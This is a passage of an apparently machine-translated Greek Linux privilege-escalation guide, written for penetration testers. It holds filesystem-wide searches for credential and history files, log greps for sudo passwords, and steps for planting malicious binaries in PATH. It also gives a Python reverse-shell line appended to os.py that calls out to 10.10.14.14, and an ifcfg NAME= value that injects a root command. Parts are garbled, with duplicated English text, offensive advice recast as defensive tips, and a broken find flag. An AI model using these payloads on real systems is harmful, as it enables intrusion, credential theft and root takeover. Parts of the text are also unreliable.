Κατά την εκτέλεση ενός penetration test, μπορεί να είναι χρήσιμο να εξετάσετε τα αρχεία βάσης δεδομένων Sqlite για πιθανές ευπάθειες ή πληροφορίες που μπορούν να χρησιμοποιηθούν για την ανέλκυση προνομιακών δικαιωμάτων.
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### Αρχεία \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml

Τα παραπάνω αρχεία είναι σημαντικά για την ασφάλεια του συστήματος. Παρακάτω παρέχονται πληροφορίες σχετικά με τη χρήση και την ασφάλεια αυτών των αρχείων:

- Το αρχείο \*\_history περιέχει το ιστορικό των εντολών που εκτελέστηκαν από τον χρήστη. Είναι σημαντικό να ελέγχεται και να διαγράφεται τακτικά για να αποτραπεί η διαρροή ευαίσθητων πληροφοριών.

- Το αρχείο .sudo\_as\_admin\_successful καταγράφει τις επιτυχημένες εκτελέσεις εντολών με δικαιώματα διαχειριστή. Αυτό το αρχείο πρέπει να προστατεύεται και να περιορίζεται η πρόσβαση σε αυτό.

- Τα αρχεία profile και bashrc περιέχουν ρυθμίσεις για το περιβάλλον του χρήστη. Είναι σημαντικό να ελέγχονται για τυχόν κακόβουλο κώδικα που μπορεί να εκτελείται κατά την είσοδο του χρήστη.

- Το αρχείο httpd.conf περιέχει τις ρυθμίσεις του διακομιστή Apache. Πρέπει να προστατεύεται για να αποτραπεί η δυνατότητα ανεξουσιοδότητης πρόσβασης ή αλλαγής των ρυθμίσεων του διακομιστή.

- Το αρχείο .plan περιέχει πληροφορίες σχετικά με τον χρήστη. Μπορεί να περιέχει ευαίσθητες πληροφορίες και πρέπει να προστατεύεται.

- Το αρχείο .htpasswd περιέχει τους κωδικούς πρόσβασης για την πιστοποίηση των χρηστών σε έναν διακομιστή Apache. Πρέπει να προστατεύεται για να αποτραπεί η δυνατότητα ανεξουσιοδότητης πρόσβασης σε αυτούς τους κωδικούς.

- Το αρχείο .git-credentials περιέχει τα διαπιστευτήρια πρόσβασης για ένα αποθετήριο Git. Πρέπει να προστατεύεται για να αποτραπεί η δυνατότητα ανεξουσιοδότητης πρόσβασης στο αποθετήριο.

- Τα αρχεία .rhosts και hosts.equiv αφορούν το πρωτόκολλο αυθεντικοποίησης rlogin. Πρέπει να προστατεύονται για να αποτραπεί η δυνατότητα ανεξουσιοδότητης πρόσβασης σε αυτά τα αρχεία.

- Τα αρχεία Dockerfile και docker-compose.yml χρησιμοποιούνται για την δημιουργία και την διαμόρφωση εικόνων Docker. Πρέπει να προστατεύονται για να αποτραπεί η δυνατότητα ανεξουσιοδότητης πρόσβασης ή αλλαγής των ρυθμίσεων των εικόνων Docker.
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυφά αρχεία

Στο λειτουργικό σύστημα Linux, τα κρυφά αρχεία είναι αρχεία που έχουν έναν τελεία (.) στην αρχή του ονόματός τους. Αυτό το σημείο στην αρχή του ονόματος του αρχείου τα καθιστά αόρατα στον κανονικό κατάλογο. Ωστόσο, μπορούμε να τα δούμε και να τα χρησιμοποιήσουμε εάν χρησιμοποιήσουμε την κατάλληλη εντολή.

Για να δείτε τα κρυφά αρχεία σε έναν κατάλογο, μπορείτε να χρησιμοποιήσετε την εντολή `ls -a`. Αυτή η εντολή θα εμφανίσει όλα τα αρχεία, συμπεριλαμβανομένων των κρυφών αρχείων, στον κατάλογο που βρίσκεστε.

Για παράδειγμα, η εντολή `ls -a /home/user` θα εμφανίσει όλα τα αρχεία, συμπεριλαμβανομένων των κρυφών αρχείων, στον κατάλογο `/home/user`.

Μπορείτε επίσης να χρησιμοποιήσετε την εντολή `ls -al` για να εμφανίσετε όλα τα αρχεία, συμπεριλαμβανομένων των κρυφών αρχείων, με περισσότερες λεπτομέρειες, όπως τα δικαιώματα πρόσβασης και οι ιδιοκτήτες των αρχείων.

Για να προσπελάσετε ένα κρυφό αρχείο, μπορείτε να χρησιμοποιήσετε την εντολή `cd` για να μεταβείτε στον κατάλογο που περιέχει το αρχείο και στη συνέχεια να χρησιμοποιήσετε το όνομα του αρχείου για να το ανοίξετε ή να το επεξεργαστείτε.

Προσέξτε ότι η ύπαρξη κρυφών αρχείων μπορεί να υποδηλώνει την παρουσία ευπάθειών ή ανεπιθύμητων δραστηριοτήτων στο σύστημα, επομένως είναι σημαντικό να εξετάζετε τα κρυφά αρχεία με προσοχή.
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Σενάρια/Δυαδικά στο PATH**

Όταν εκτελείτε ένα πρόγραμμα από το τερματικό, το σύστημα αναζητά το πρόγραμμα στις διαδρομές που ορίζονται από τη μεταβλητή περιβάλλοντος PATH. Αυτό σημαίνει ότι, αν ένα κακόβουλο σενάριο ή δυαδικό τοποθετηθεί σε μια από αυτές τις διαδρομές, μπορεί να εκτελεστεί από οποιονδήποτε χρήστης.

Για να εκμεταλλευτείτε αυτήν την ευπάθεια, μπορείτε να τοποθετήσετε ένα κακόβουλο σενάριο ή δυαδικό σε μια από τις διαδρομές του PATH, έτσι ώστε να εκτελεστεί με τα δικαιώματα του χρήστη που το εκτελεί.

Για να εκμεταλλευτείτε αυτήν την ευπάθεια, μπορείτε να ακολουθήσετε τα παρακάτω βήματα:

1. Εντοπίστε τις διαδρομές που ορίζονται από τη μεταβλητή περιβάλλοντος PATH.
2. Επιλέξτε μια από αυτές τις διαδρομές και τοποθετήστε ένα κακόβουλο σενάριο ή δυαδικό μέσα.
3. Αλλάξτε τα δικαιώματα του κακόβουλου σεναρίου ή δυαδικού ώστε να είναι εκτελέσιμο από οποιονδήποτε χρήστη.
4. Αναμένετε να εκτελεστεί το κακόβουλο σενάριο ή δυαδικό από έναν χρήστη, προκαλώντας έτσι ανόδο των δικαιωμάτων του.
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Αρχεία Ιστού**

Web files are files that are used by web applications and websites. These files can include HTML, CSS, JavaScript, image files, and other resources that are necessary for the proper functioning and display of a website.

Τα αρχεία ιστού είναι αρχεία που χρησιμοποιούνται από εφαρμογές και ιστότοπους. Αυτά τα αρχεία μπορεί να περιλαμβάνουν HTML, CSS, JavaScript, αρχεία εικόνας και άλλους πόρους που είναι απαραίτητοι για τη σωστή λειτουργία και εμφάνιση ενός ιστότοπου.

### **Web Server Configuration Files**

Web server configuration files are files that contain settings and directives for the web server software. These files determine how the web server behaves and handles incoming requests. Examples of web server configuration files include Apache's `httpd.conf` and Nginx's `nginx.conf`.

Τα αρχεία διαμόρφωσης του διακομιστή ιστού είναι αρχεία που περιέχουν ρυθμίσεις και οδηγίες για το λογισμικό του διακομιστή ιστού. Αυτά τα αρχεία καθορίζουν τον τρόπο με τον οποίο ο διακομιστής ιστού συμπεριφέρεται και χειρίζεται τα εισερχόμενα αιτήματα. Παραδείγματα αρχείων διαμόρφωσης διακομιστή ιστού περιλαμβάνουν το `httpd.conf` του Apache και το `nginx.conf` του Nginx.

### **Web Application Configuration Files**

Web application configuration files are files that contain settings and configurations specific to a web application. These files determine how the web application behaves and can include information such as database connection details, security settings, and application-specific configurations. Examples of web application configuration files include `wp-config.php` for WordPress and `settings.py` for Django.

Τα αρχεία διαμόρφωσης της εφαρμογής ιστού είναι αρχεία που περιέχουν ρυθμίσεις και διαμορφώσεις που είναι συγκεκριμένες για μια εφαρμογή ιστού. Αυτά τα αρχεία καθορίζουν τον τρόπο με τον οποίο η εφαρμογή ιστού συμπεριφέρεται και μπορεί να περιλαμβάνουν πληροφορίες όπως λεπτομέρειες σύνδεσης στη βάση δεδομένων, ρυθμίσεις ασφαλείας και διαμορφώσεις που είναι συγκεκριμένες για την εφαρμογή. Παραδείγματα αρχείων διαμόρφωσης εφαρμογής ιστού περιλαμβάνουν το `wp-config.php` για το WordPress και το `settings.py` για το Django.
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα Ασφαλείας**

Οι αντίγραφα ασφαλείας είναι ένα σημαντικό μέτρο για την προστασία των δεδομένων σας. Εάν οι δεδομένες σας υποστούν ζημιά ή χαθούν λόγω επίθεσης ή τεχνικού προβλήματος, η ύπαρξη αντιγράφων ασφαλείας θα σας επιτρέψει να ανακτήσετε τα δεδομένα σας.

Παρακάτω παρέχονται ορισμένες συμβουλές για την αποτελεσματική διαχείριση των αντιγράφων ασφαλείας:

- Κάντε τακτικά αντίγραφα ασφαλείας των δεδομένων σας και βεβαιωθείτε ότι αυτά τα αντίγραφα αποθηκεύονται σε ασφαλή τοποθεσία.
- Ελέγξτε την ακεραιότητα των αντιγράφων ασφαλείας για να βεβαιωθείτε ότι είναι πλήρη και ακέραια.
- Κρατήστε πολλαπλά αντίγραφα ασφαλείας σε διαφορετικές τοποθεσίες για μεγαλύτερη ασφάλεια.
- Επανεξετάστε τη διαδικασία ανάκτησης από αντίγραφα ασφαλείας για να είστε σίγουροι ότι λειτουργεί σωστά.

Μην ξεχνάτε ότι η διατήρηση αντιγράφων ασφαλείας είναι εξίσου σημαντική με την προστασία των συστημάτων σας από επιθέσεις.
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν κωδικούς πρόσβασης

Διαβάστε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), αναζητά **πολλά δυνητικά αρχεία που μπορεί να περιέχουν κωδικούς πρόσβασης**.\
Ένα **άλλο ενδιαφέρον εργαλείο** που μπορείτε να χρησιμοποιήσετε για αυτό είναι το: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) το οποίο είναι μια εφαρμογή ανοιχτού κώδικα που χρησιμοποιείται για την ανάκτηση πολλών κωδικών πρόσβασης που αποθηκεύονται σε έναν τοπικό υπολογιστή για τα Windows, Linux & Mac.

### Αρχεία καταγραφής

Εάν μπορείτε να διαβάσετε τα αρχεία καταγραφής, μπορεί να είστε σε θέση να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο παράξενο είναι το αρχείο καταγραφής, τόσο πιο ενδιαφέρον θα είναι (πιθανώς).\
Επίσης, ορισμένα "**κακά**" ρυθμισμένα (με παρασκηνιακή πρόσβαση?) **αρχεία καταγραφής ελέγχου** μπορεί να σας επιτρέψουν να **καταγράψετε κωδικούς πρόσβασης** μέσα στα αρχεία καταγραφής ελέγχου, όπως εξηγείται σε αυτήν την ανάρτηση: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Για να **διαβάσετε τα αρχεία καταγραφής της ομάδας** [**adm**](interesting-groups-linux-pe/#adm-group) θα είναι πολύ χρήσιμο.

### Αρχεία κελύφους
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Γενική αναζήτηση/Regex για διαπιστευτήρια

Θα πρέπει επίσης να ελέγξετε για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομά** τους ή μέσα στο **περιεχόμενο**, καθώς επίσης να ελέγξετε για διευθύνσεις IP και ηλεκτρονικά ταχυδρομεία μέσα σε αρχεία καταγραφής ή με χρήση των regex για κατακερματισμούς.\
Δεν πρόκειται να αναφέρω εδώ πώς να κάνετε όλα αυτά, αλλά αν σας ενδιαφέρει μπορείτε να ελέγξετε τους τελευταίους ελέγχους που πραγματοποιεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Εγγράψιμα αρχεία

### Απάτη με την κατάχρηση βιβλιοθήκης Python

Εάν γνωρίζετε από **πού** θα εκτελεστεί ένα σενάριο Python και μπορείτε να **γράψετε μέσα** σε αυτόν τον φάκελο ή μπορείτε να **τροποποιήσετε τις βιβλιοθήκες Python**, μπορείτε να τροποποιήσετε τη βιβλιοθήκη του λειτουργικού συστήματος και να την παραβιάσετε (εάν μπορείτε να γράψετε εκεί που θα εκτελεστεί το σενάριο Python, αντιγράψτε και επικολλήστε τη βιβλιοθήκη os.py).

Για να **παραβιάσετε τη βιβλιοθήκη**, απλά προσθέστε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (αλλάξτε την IP και τη θύρα):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Εκμετάλλευση του Logrotate

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **δικαιώματα εγγραφής** σε ένα αρχείο καταγραφής ή στους γονικούς φακέλους του να αποκτήσουν πιθανά αυξημένα προνόμια. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά εκτελείται ως **root**, μπορεί να παραπλανηθεί για να εκτελέσει αυθαίρετα αρχεία, ειδικά σε φακέλους όπως ο _**/etc/bash_completion.d/**_. Είναι σημαντικό να ελέγχετε τα δικαιώματα όχι μόνο στον φάκελο _/var/log_ αλλά και σε οποιονδήποτε φάκελο εφαρμόζεται η περιστροφή των καταγραφών.

{% hint style="info" %}
Αυτή η ευπάθεια επηρεάζει την έκδοση `3.18.0` και παλαιότερες του `logrotate`
{% endhint %}

Περισσότερες λεπτομέρειες για την ευπάθεια μπορείτε να βρείτε σε αυτήν τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείτε να εκμεταλλευτείτε αυτήν την ευπάθεια με το [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με το [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(καταγραφές nginx)**, οπότε όποτε ανακαλύπτετε ότι μπορείτε να αλλάξετε τις καταγραφές, ελέγξτε ποιος διαχειρίζεται αυτές τις καταγραφές και ελέγξτε αν μπορείτε να αυξήσετε τα προνόμια αντικαθιστώντας τις καταγραφές με συμβολικά συνδέσμους.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Αναφορά ευπάθειας:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Εάν, για οποιονδήποτε λόγο, ένας χρήστης μπορεί να **εγγράψει** ένα σενάριο `ifcf-<οτιδήποτε>` στο _/etc/sysconfig/network-scripts_ **ή** μπορεί να **προσαρμόσει** ένα υπάρχον, τότε το **σύστημά σας είναι παραβιασμένο**.

Τα σενάρια δικτύου, για παράδειγμα το _ifcg-eth0_, χρησιμοποιούνται για τις συνδέσεις δικτύου. Φαίνονται ακριβώς σαν αρχεία .INI. Ωστόσο, στο Linux, είναι \~εισαγόμενα\~ από τον Διαχειριστή Δικτύου (dispatcher.d).

Στην περίπτωσή μου, το `NAME=` που ανατίθεται σε αυτά τα σενάρια δικτύου δεν χειρίζεται σωστά. Εάν έχετε **κενό/κενό διάστημα στο όνομα, το σύστημα προσπαθεί να εκτελέσει το τμήμα μετά το κενό/κενό διάστημα**. Αυτό σημαίνει ότι **ό,τι βρίσκεται μετά το πρώτο κενό/κενό διάστημα εκτελείται ως root**.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, και rc.d**

Ο κατάλογος `/etc/init.d` είναι ο τόπος διαμονής **σεναρίων** για το System V init (SysVinit), το **κλασικό σύστημα διαχείρισης υπηρεσιών του Linux**. Περιλαμβάνει σενάρια για την εκκίνηση (start), τον τερματισμό (stop), την επανεκκίνηση (restart) και, μερικές φορές, την ανανέωση (reload) των υπηρεσιών. Αυτά μπορούν να εκτελεστούν απευθείας ή μέσω συμβολικών συνδέσμων που βρίσκονται στον κατάλογο `/etc/rc?.d/`. Ένας εναλλακτικός δρομολόγιο στα συστήματα Redhat είναι ο `/etc/rc.d/init.d`.

Από την άλλη πλευρά, το `/etc/init` συσχετίζεται με το **Upstart**, ένα πιο νέο **σύστημα διαχείρισης υπηρεσιών** που εισήχθη από το Ubuntu, χρησιμοποιώντας αρχεία διαμόρφωσης για τις εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση στο Upstart, τα σενάρια SysVinit εξακολουθούν να χρησιμοποιούνται παράλληλα με τις διαμορφώσεις Upstart λόγω μιας συμβατότητας στρώματος στο Upstart.

Το **systemd** εμφανίζεται ως ένας σύγχρονος διαχειριστής εκκίνησης και υπηρεσιών, προσφέροντας προηγμένες δυνατότητες όπως η εκκίνηση δαίμονων κατά απαίτηση, η διαχείριση των αυτόματων συστάσεων και οι αντιγραφές ασφαλείας της κατάστασης του συστήματος. Οργανώνει τα αρχεία στον κατάλογο `/usr/lib/systemd/` για τα πακέτα διανομής και στον κατάλογο `/etc/systemd/system/` για τις τροποποιήσεις του διαχειριστή, διευκολύνοντας τη διαδικασία διαχείρισης του συστήματος.

## Άλλα Κόλπα

### Εκμετάλλευση Προνομιακής Αύξησης μέσω NFS

{% content-ref url="nfs-no\_root\_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Απόδραση από περιορισμένα Shells

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Προστασίες Ασφάλειας του Πυρήνα

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Περισσότερη Βοήθεια

[Στατικά δυαδικά αρχεία impacket](https://github.com/ropnop/impacket\_static\_binaries)

## Εργαλεία Προνομιακής Αύξησης για Linux/Unix

### **Το καλύτερο εργαλείο για την αναζήτηση διανυσματων προνομιακής αύξησης σε τοπικό Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Απαριθμεί ευπάθειες πυρήνα σε Linux και MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (με φυσική πρόσβαση):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Συλλογή περισσότερων σεναρίων**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Αναφορές

* [https://blog.g0tmi1k.com/2011/08/basic-linux-
